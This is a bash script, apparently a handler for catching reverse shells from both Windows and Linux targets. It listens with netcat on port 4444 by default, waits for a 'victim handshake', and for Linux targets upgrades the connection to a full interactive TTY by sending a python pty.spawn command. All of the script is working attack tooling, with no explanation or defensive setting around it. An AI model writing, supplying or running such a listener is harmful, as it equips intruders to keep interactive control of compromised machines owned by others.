#!/bin/bash
PORT=${1:-4444}

# Clear any hanging listeners
fuser -k $PORT/tcp 2>/dev/null

echo -e "\e[1;32m[+]\e[0m Multi-Platform Listener on port \e[1;33m$PORT\e[0m..."
echo "[*] Waiting for victim handshake..."

# 1. Catch the Handshake
# We use a temporary file to ensure we catch the output of nc correctly
IDENT=$(nc -lvnp $PORT | head -n 1 | tr -d '\r\n')

if [[ "$IDENT" == *"WINDOWS_SHELL"* ]]; then
    echo -e "\e[1;36m[*]\e[0m Windows Handshake Received!"
    echo "[*] Rebooting listener for persistent shell..."
    sleep 1 # Synchronize with PowerShell's sleep
    stty sane
    nc -lvnp $PORT

elif [[ "$IDENT" == *"LINUX_SHELL"* ]]; then
    echo -e "\e[1;34m[*]\e[0m Linux Handshake Received!"
    echo "[*] Upgrading to Interactive TTY..."
    sleep 1
    stty raw -echo
    (echo "stty cols $(tput cols) rows $(tput lines) 2>/dev/null; export TERM=xterm-256color; python3 -c 'import pty; pty.spawn(\"/bin/bash\")' || /usr/bin/script -qc /bin/bash /dev/null"; cat) | nc -lvnp $PORT
    stty sane

else
    echo -e "\e[1;31m[!]\e[0m Unknown handshake: '$IDENT'"
    stty sane
    nc -lvnp $PORT
fi
